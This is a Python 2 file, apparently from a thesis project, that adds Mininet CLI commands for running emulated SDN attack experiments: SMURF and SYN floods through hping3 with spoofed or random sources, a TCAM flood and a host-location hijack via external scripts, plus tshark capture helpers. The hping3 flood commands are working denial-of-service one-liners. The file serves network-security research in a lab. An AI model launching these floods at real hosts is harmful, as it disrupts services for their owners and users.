from subprocess import call,Popen, PIPE, STDOUT
from cmd import Cmd
from os import isatty
from select import poll, POLLIN
import signal
import sys
import time
import os
import atexit
import thread,threading
import Queue

from scapy.all import sendp, IP, UDP, Ether, TCP, RandMAC
from random import randrange

from mininet.cli import CLI
from mininet.log import info, output, error
from mininet.term import makeTerms, runX11
from mininet.util import ( quietRun, dumpNodeConnections,
                           dumpPorts )

class CLI1( CLI ):
 
    def do_simulasi2( self, _line ):
        "simulasi berulang"
        args = _line.split()
        if len(args) != 1:
            error( 'invalid number of args: simulasi name_file\n' )
        else:
            self.default("s1 rm -rf capture/*")
            self.default("s1 rm perc*")
            first=True

            for sw in range(int(args[0])):
                if not(first):
                    time.sleep(60)
                print "percobaan ",sw
                self.do_simulasi("perc"+str(sw))
                first=False

    def do_simulasi3( self, _line ):
        "simulasi datas berulang"
        args = _line.split()
        if len(args) != 1:
            error( 'invalid number of args: simulasi name_file\n' )
        else:
            self.default("s1 rm -rf capture/*")
            background="67"
            for sw in range(int(args[0])):
                self.simulasiBackground("perc"+str(sw),background)
                time.sleep(60)
   

    def tshark(node,intfs=[],file="None"):
        cmd="tshark"
        directory="capture"
        for i in intfs:
            cmd=cmd+" -i "+i
        
        if not os.path.exists(directory):
            os.makedirs(directory)
            node.cmd( cmd+" -w "+directory+"/"+file+".pcap")

    def do_TCAM( self, _line ):
        "Lauch TCAM flood attack"
        args = _line.split()
        if len(args) != 1:
            error( 'invalid number of args: time\n' )
        else:
            dur=args[0]
            h2 = self.mn[ "h2" ]
            h3 = self.mn[ "h3" ]
            h2serv=TCAMAtack(h2,0,dur)
            h3serv=TCAMAtack(h3,1,dur)
            h2serv.start()
            h3serv.start()

            status=h2serv.is_alive() or h3serv.is_alive()
            try:
                output( '\nH2 and H3 does attack\n')
                while status:
                    time.sleep(1)
                    status=h2serv.is_alive() or h3serv.is_alive()
                h2serv.stop()
                h3serv.stop()

            except KeyboardInterrupt:
                # Output a message - unless it's also interrupted
                # pylint: disable=broad-except
                try:
                    output( '\nInterrupt\n' )
                    h2serv.stop()
                    h3serv.stop()
                except Exception:
                    pass

 
    def do_SMURF( self, _line ):
        "Lauch SMURF flood attack"
        args = _line.split()
        if len(args) != 1:
            error( 'invalid number of args: simulasi time\n' )
        else:

            dur=args[0]
            h2 = self.mn[ "h2" ]
            h3 = self.mn[ "h3" ]
            h5 = self.mn[ "h5" ]
            h2serv=DOSSMURF(h2,dur)
            h3serv=DOSSMURF(h3,dur)
            h5serv=DOSSMURF(h5,dur)
           
            try:
                h2serv.start()
                h3serv.start()
                h5serv.start()
                status=h5serv.is_alive()
                while status:
                    status=h5serv.is_alive()
                    output( '\nH2 status '+str(status)+' \n')
                    time.sleep(1)
                h2serv.stop()
                h3serv.stop()
                h5serv.stop()      
            except KeyboardInterrupt:
                # Output a message - unless it's also interrupted
                # pylint: disable=broad-except
                try:
                    output( '\nInterrupt\n' )
                    h2serv.stop()
                    h3serv.stop()
                    h5serv.stop()
                except Exception:
                    pass

    def do_SYNATACK( self, _line ):
        "Lauch SYN flood attack"
        args = _line.split()
        if len(args) != 1:
            error( 'invalid number of args: simulasi time\n' )
        else:

            dur=args[0]
            h2 = self.mn[ "h2" ]
            h3 = self.mn[ "h3" ]
            h5 = self.mn[ "h5" ]
            h2serv=DOSSYN(h2,dur)
            h3serv=DOSSYN(h3,dur)
            h5serv=DOSSYN(h5,dur)

            try:
                h2serv.start()
                h3serv.start()
                h5serv.start()
                status=h5serv.is_alive()
                while status:
                    status=h5serv.is_alive()
                    output( '\nH2 status '+str(status)+' \n')
                    time.sleep(1)
                h2serv.stop()
                h3serv.stop()
                h5serv.stop() 
            except KeyboardInterrupt:
                # Output a message - unless it's also interrupted
                # pylint: disable=broad-except
                try:
                    output( '\nInterrupt\n' )
                    h2serv.stop()
                    h3serv.stop()
                    h5serv.stop()
                except Exception:
                    pass

    def do_HHIJACK( self, _line ):
        "Host location hijack h1 to h2"
        args = _line.split()
        if len(args) != 1:
            error( 'invalid number of args: simulasi name_file\n' )
        else:
            s1 = self.mn[ "s1" ]
            h2 = self.mn[ "h2" ]
            h4 = self.mn[ "h4" ]

            h2serv=ServerAtack(h2)
            try:

                h2serv.start()
                status=h2serv.is_alive()
                h4.sendCmd("sudo -u pasca firefox --new-window 10.0.0.1:80 --devtools")
                output( '\nH2 attack and open firefox in h4, try to access 10.0.0.1\n')
                while status:
                    status=h2serv.is_alive()
                    output( '\nH2 status '+str(status)+' \n')
                    time.sleep(1)
                self.waitForNode(h4)
                h2serv.stop()                
            except KeyboardInterrupt:
                # Output a message - unless it's also interrupted
                # pylint: disable=broad-except
                try:
                    output( '\nInterrupt\n' )
                    h2serv.stop()
                    h4.sendInt()
                except Exception:
                    pass

            # popen=h2.popen("python -m SimpleHTTPServer 80",cwd=os.path.expanduser('~/topo/attacker'))
            # h2.cmdPrint('cd ~/topo/attacker')
            # h2.cmdPrint('pwd')
            # tsark2 = Tshark(s1,["eth0"],delaySetup)
            # tsark2.start()
            
            # time.sleep(10)
            # h2serv.stop()
            # popen.terminate()
            
            # while tsark2.is_alive():
            #     # print "send intrupt s1"
            #     s1.sendInt()
            #     time.sleep(0.2)

class DOSSMURF(threading.Thread):
    def __init__(self,node,time=10):
        threading.Thread.__init__(self)
        self.node=node
        self.time=int(time)

    def run(self):
        try:
            self.popen=self.node.popen("hping3 -1 --flood -a 10.0.0.1 10.0.0.255")
            start = time.time()
            while int(time.time()-start)<self.time:
                time.sleep(0.1)
            self.popen.terminate()
        except Exception as e:
            print sys.exc_info()
    def stop(self):
        try:
            self.popen.terminate()
        except Exception as e:
            print sys.exc_info()

class DOSSYN(threading.Thread):
    def __init__(self,node,time=10):
        threading.Thread.__init__(self)
        self.node=node
        self.time=int(time)

    def run(self):
        try:
            self.popen=self.node.popen("hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.0.0.1")
            start = time.time()
            while int(time.time()-start)<self.time:
                time.sleep(0.1)
            self.popen.terminate()
        except Exception as e:
            print sys.exc_info()
    def stop(self):
        try:
            self.popen.terminate()
        except Exception as e:
            print sys.exc_info()

class TCAMAtack(threading.Thread):
    def __init__(self,node,seq=0,time=30):
        threading.Thread.__init__(self)
        self.node=node
        self.time=int(time)
        self.seq=seq

    def run(self):
        try:
            if(self.seq==0):
                self.popen=self.node.popen("python attacklaunch.py")
            else:
                self.popen=self.node.popen("python attacklaunch2.py")
            start = time.time()
            while int(time.time()-start)<self.time:
                time.sleep(0.1)
            self.popen.terminate()
        except KeyboardInterrupt:
            self.popen.terminate()
        except Exception as e:
            print sys.exc_info()
    def stop(self):
        try:
            self.popen.terminate()
        except Exception as e:
            print sys.exc_info()

    def sourceIPgen():
        #this function generates random IP addresses
        # these values are not valid for first octet of IP address
        not_valid = [10,127,254,255,1,2,169,172,192]

        first = randrange(1,256)

        while first in not_valid:
            first = randrange(1,256)
            # print first
            ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
            # print ip
        return ip

class ServerAtack(threading.Thread):
    def __init__(self,node):
        threading.Thread.__init__(self)
        self.node=node

    def run(self):
        try:
            
            self.popen=self.node.popen("python -m SimpleHTTPServer 80",cwd=os.path.expanduser('~/thesis/attacker'))
            self.popen2=self.node.popen("python hijack.py")
        except Exception as e:
            print sys.exc_info()
    def stop(self):
        try:
            self.popen.terminate()
            self.popen2.send_signal(signal.SIGINT)
        except Exception as e:
            output(e+'\n')

class GeneratorPacket(threading.Thread):

    def __init__(self,node,mode="server",transport="",host="",port="",time="10",service="datas",id="0"):
        threading.Thread.__init__(self)
        self.node=node
        self.cmd="python throughput3.py "+mode+" "+transport+" -host "+host+" -p "+port+" -t "+time+" -s "+service+" -id "+id

    def run(self):
        try:
            print "run "+self.cmd
            # self.node.cmd(self.cmd) 

            self.node.cmd( self.cmd )
        except Exception as e:
            print sys.exc_info()
         
class Tshark(threading.Thread):
    """docstring for ClassName"""
    def __init__(self,node,intfs=[],file="None"):
        threading.Thread.__init__(self)
        self.node=node
        self.intfs=intfs
        self.file=file
        # self.bucket = bucket
        cmd="tshark"
        for i in intfs:
            cmd=cmd+" -i "+i
        self.cmd=cmd

    def run(self):
        flag=True
        # while flag:
        try:
            print "run "+self.cmd
            self.node.cmd( self.cmd+" -w capture/"+self.file+".pcap")
            
            flag=False
        except Exception:
            print "exception"
            print sys.exc_info()
            pass